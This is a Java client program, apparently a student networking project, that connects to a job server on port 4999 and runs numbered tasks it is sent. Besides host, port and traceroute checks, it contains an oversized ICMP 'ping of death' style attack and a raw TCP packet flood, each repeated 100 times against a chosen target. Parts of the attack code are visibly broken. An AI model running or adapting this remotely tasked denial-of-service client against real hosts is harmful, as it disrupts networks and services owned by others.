import org.pcap4j.core.*;
import org.pcap4j.packet.*;
import org.pcap4j.packet.namednumber.*;
import org.pcap4j.util.MacAddress;

import java.io.*;
import java.net.*;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.Locale;

public class Jobseeker2 {
    public static Socket socket;
    public static InputStream input;
    public static BufferedReader reader;
    public static OutputStream output;
    public static PrintWriter writer;
    public static boolean unknownHost;
    public final static String os = System.getProperty("os.name").toLowerCase();
    public static FileWriter theFile;

    public static String getHostname() {
        try {
            return InetAddress.getLocalHost().getHostName();
        } catch(UnknownHostException e) {
            return "unknown";
        }
    }

    public static void getIOStreams() {
        try {
            input = socket.getInputStream();
            output = socket.getOutputStream();
        } catch (IOException ignored) { }

        reader = new BufferedReader(new InputStreamReader(input));
        writer = new PrintWriter(output, true);
    }

    public static void closeIOStreams() {
        try {
            input.close();
            output.close();
        } catch (IOException ignored) { }
    }

    public static boolean setSocket(String hostname, int port) {
        try {
            socket = new Socket(hostname, port);
            return true;
        } catch(IOException e) {
            return false;
        }
    }

    public static void closeSocket() {
        try {
            socket.close();
        } catch(IOException ignored) { }
    }

    public static byte[] convertIP(String IPString) {
        String replaced = IPString.replace('.', ',');
        String[] newIPString = replaced.split(",");

        byte[] ipAddress = new byte[newIPString.length];
        for(int i = 0; i < newIPString.length; i++) {
            ipAddress[i] = (byte) Integer.parseInt(newIPString[i]);
        }

        return ipAddress;
    }

    public static String getJob() {
        try {
            return reader.readLine();
        }
        catch(IOException e) {
            return "error";
        }
    }

    public static boolean work() {
        String job = getJob();

        // No job received, no need to work
        if(job.compareTo("error") == 0)
            return false;

        // Parse job
        String[] tokens = job.split(",");

        switch (Integer.parseInt(tokens[0])) {
            // JOB: Detect if a given IP address or Host Name is online or not
            case 1:
                // Output of job
                if(isOnline(Integer.parseInt(tokens[1]), tokens[2]))
                    writer.println(tokens[2] + " is online.");
                else {
                    if(unknownHost)
                        writer.println(tokens[2] + " is an unknown host.");
                    else
                        writer.println(tokens[2] + " is not online.");
                    unknownHost = false;
                }
                break;
            // JOB: Detect the status of a given port at a given IP address
            case 2:
                // Output of job
                String output = TCPUDPOpenClose(Integer.parseInt(tokens[1]), tokens[2]);
                if(unknownHost)
                        writer.println(tokens[2] + " is an unknown host.");
                else
                    writer.println("The status of port " + tokens[1] + " at IP address " + tokens[2] + " is: " + output);
                unknownHost = false;
                break;
            // JOB: 3
            case 3:
                for(int i = 0; i < 100; i++) {
                    icmpAttack(tokens[2]);
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
                break;
            case 4:
                for(int i = 0; i < 100; i++) {
                    try {
                        tcpAttack(tokens[1], Integer.parseInt(tokens[2]));
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
                break;
            case 5:
                try {
                    Traceroute(socket.getInetAddress().getHostAddress());
                } catch (IOException e) {e.printStackTrace();}
            default:
                writer.println("Other job output.");
                break;
        }
        return true;
    }

    public static boolean isOnline(int mode, String who) {
        if(mode == 1) {
            try {
                return InetAddress.getByAddress(convertIP(who)).isReachable(2000);
            } catch(UnknownHostException e) {
                unknownHost = true;
                return false;
            } catch(IOException ignored) { }
        }

        else {
            try {
                return InetAddress.getByName(who).isReachable(2000); // Checking if Host Name is online
            } catch(UnknownHostException e) {
                unknownHost = true;
                return false;
            } catch(IOException ignored) { }
        }

        return false;
    }

    public static String TCPUDPOpenClose(int portNum, String ip) {
        String output = "closed";
        InetAddress ipAddress;
        try {
            ipAddress = InetAddress.getByAddress(convertIP(ip));
        } catch (UnknownHostException e) {
            unknownHost = true;
            return "";
        }
        try {
            (new DatagramSocket(portNum, ipAddress)).close();
            output = "UDP open";
            (new Socket(ipAddress, portNum)).close();
            return "TCP and UDP open";
        } catch(IOException ignored) { }

        try {
            (new Socket(ipAddress, portNum)).close();
            output = "TCP open";
        } catch(IOException ignored) { }

        return output;
    }

    public static void icmpAttack(String target) {
        System.out.println("Entered icmpAttack.");
        PcapHandle handler;
        PcapNetworkInterface devices;
        PcapStat stat;


        byte[] data = new byte[70000];
        for(int i=0; i< data.length; i++){
            data[i] = (byte) i;
        }

        if(target.contains("/")){

        }
        else{

        }


        try{
            InetAddress targetAddress = InetAddress.getByName(target);
            InetAddress localhost = InetAddress.getLocalHost();
            NetworkInterface ni = NetworkInterface.getByInetAddress(targetAddress);
            NetworkInterface niLocal = NetworkInterface.getByInetAddress(localhost);


            byte[] mac = niLocal.getHardwareAddress();
            System.out.println("Garbage: "+mac.toString());
            MacAddress sourceMac = MacAddress.getByAddress(niLocal.getHardwareAddress());
            if(sourceMac != null)
                System.out.println("Source Mac Address is(String): "+sourceMac.toString());
            else
                System.out.println("Source Mac Address is NULL");

            devices = Pcaps.getDevByAddress(localhost);
            System.out.println(devices);
            System.out.println("Local: "+niLocal.getDisplayName());

            System.out.println("Before Handler");
            handler = devices.openLive(65570, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 60);
            stat = handler.getStats();
            System.out.println("Before Handler SendPacket");
            System.out.println("\nReceiving Packets\n");
            PacketListener packetlistener = new PacketListener() {
                @Override
                public void gotPacket(PcapPacket pcapPacket) {
                    System.out.println("Received packets: ");
                    System.out.println(pcapPacket.getTimestamp());
                    System.out.println(pcapPacket);
                }
            };

            IcmpV4EchoPacket.Builder echoPacket = new IcmpV4EchoPacket.Builder();
            echoPacket.identifier((short) 1);
            echoPacket.payloadBuilder(new UnknownPacket.Builder().rawData(data));

            IcmpV4CommonPacket.Builder echoIcmp = new IcmpV4CommonPacket.Builder();
            echoIcmp.type(IcmpV4Type.ECHO);
            echoIcmp.code(IcmpV4Code.NO_CODE);
            echoIcmp.payloadBuilder(echoPacket);
            echoIcmp.correctChecksumAtBuild(true);

            IpV4Packet.Builder ipV4Builder = new IpV4Packet.Builder();
            ipV4Builder.version(IpVersion.IPV4);
            ipV4Builder.tos(IpV4Rfc791Tos.newInstance((byte) 0));
            ipV4Builder.ttl((byte) 100);
            ipV4Builder.protocol(IpNumber.ICMPV4);
            ipV4Builder.srcAddr((Inet4Address) InetAddress.getLocalHost());
            ipV4Builder.dstAddr((Inet4Address) InetAddress.getByName(target));
            ipV4Builder.payloadBuilder(echoIcmp);
            ipV4Builder.correctChecksumAtBuild(true);
            for (Packet.Builder builder : ipV4Builder.correctLengthAtBuild(true)) {
                System.out.println("****************");
                System.out.println("Sending Echo request Packets");
                System.out.println("****************");
                //comment line below to execute on Windows
                //handler.sendPacket(data);
            }

            EthernetPacket.Builder ethernet = new EthernetPacket.Builder();
            ethernet.dstAddr(MacAddress.ETHER_BROADCAST_ADDRESS);
            ethernet.srcAddr(sourceMac);
            ethernet.type(EtherType.IPV4);
            ethernet.paddingAtBuild(true);

            Packet packet = ethernet.build();
            System.out.println("****************");
            System.out.println("Sending Echo request Packets");
            System.out.println("****************");

            handler.sendPacket(packet);
            //handler.loop(40, packetlistener);

            System.out.println(stat.getNumPacketsCaptured());
        }
        catch (Exception p){
            p.printStackTrace();
        }
    }

    public static void tcpAttack(String target, int port) throws IOException {
        PcapHandle handler = null;
        PcapNetworkInterface devices;

        System.out.println("Connection port: "+socket.getLocalPort());
        theFile.write("Connection port: "+socket.getLocalPort()+"\n");
        int localPort = socket.getLocalPort();
        byte[] data = new byte[900];
        for(int i=0; i < data.length; i++){
            data[i] = (byte) i;
        }

        try {
            // Getting the inet address of both the localhost and targethost
            InetAddress targetAddress = InetAddress.getByName(target);
            InetAddress localhost = InetAddress.getLocalHost();

            // Creating a TCP packet
            TcpPacket.Builder tcpPacket = new TcpPacket.Builder();
            tcpPacket.payloadBuilder(new UnknownPacket.Builder().rawData(data));
            tcpPacket.srcAddr(localhost);
            tcpPacket.dstAddr(targetAddress);
            tcpPacket.srcPort(TcpPort.getInstance((short)localPort));
            tcpPacket.dstPort(TcpPort.getInstance((short) port));
            tcpPacket.correctLengthAtBuild(true);
            tcpPacket.correctChecksumAtBuild(true);

            IpV4Packet.Builder ipV4PacketBuilder = new IpV4Packet.Builder();
            ipV4PacketBuilder.payloadBuilder(tcpPacket);
            ipV4PacketBuilder.version(IpVersion.IPV4);
            ipV4PacketBuilder.tos((IpV4Packet.IpV4Tos) () -> (byte) 0);
            ipV4PacketBuilder.protocol(IpNumber.TCP);
            ipV4PacketBuilder.srcAddr((Inet4Address) localhost);
            ipV4PacketBuilder.dstAddr((Inet4Address) targetAddress);
            ipV4PacketBuilder.correctLengthAtBuild(true);
            ipV4PacketBuilder.correctChecksumAtBuild(true);

            IpV4Packet ipV4Packet = ipV4PacketBuilder.build();
            data = ipV4Packet.getRawData();
            System.out.println("New packet: "+IpV4Packet.newPacket(data,0,data.length));
            theFile.write("New packet: "+IpV4Packet.newPacket(data,0,data.length) + "\n");
            devices = Pcaps.getDevByAddress(localhost);
            handler = devices.openLive(65570, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 60);
            handler.sendPacket(data);

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public static void Traceroute(String ip) throws IOException {



        Process traceRt;



        if(os.contains("win"))          //if the operating system is Windows
            traceRt = Runtime.getRuntime().exec("tracert " + ip);

        else                            //if it's mac or linux
            traceRt = Runtime.getRuntime().exec("traceroute " + ip);

        StringBuilder textBuilder = new StringBuilder();


        try (Reader reader = new BufferedReader(new InputStreamReader(traceRt.getInputStream(), Charset.forName(StandardCharsets.UTF_8.name())))) {

            int c = 0;
            while ((c = reader.read()) != -1) {
                textBuilder.append((char) c);
            }
        }

        System.out.println(textBuilder);
        theFile.write(textBuilder+"\n");

    }

    public static void main(String[] args) {
        int port = 4999;
        String hostname = getHostname();
        try {
            theFile = new FileWriter("jobSeekerOutput.txt");
        } catch (IOException e) {
            e.printStackTrace();
        }
        if(hostname.compareTo("unknown") == 0)
            hostname = "localhost";

        while(true) {
            if(!setSocket(hostname, port))
                break;
            getIOStreams();

            if(!work()) {
                writer.println("error");
                break;
            }

            closeIOStreams();
            closeSocket();
        }

        closeIOStreams();
        closeSocket();
    }
}
